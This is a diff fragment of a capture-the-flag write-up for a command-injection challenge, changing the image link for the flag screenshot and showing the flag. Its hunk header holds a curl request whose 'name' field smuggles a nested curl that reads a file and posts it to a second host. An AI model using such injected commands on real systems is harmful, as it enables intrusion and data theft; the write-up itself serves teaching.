@@ -34,6 +34,6 @@ curl http://10.105.0.21:21520/ -d 'name=example.$(curl 10.105.2.22 -d "$(cat /$(
 ```
 
 ### Flag
-![image](https://hackmd.io/_uploads/SJaw3er_p.png)
+![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/481aad11-e682-4ccc-8333-a8f3f62d337e)
 
 `AIS3{jUsT_3@$y_cOMmAnD_INJEc7ION}`
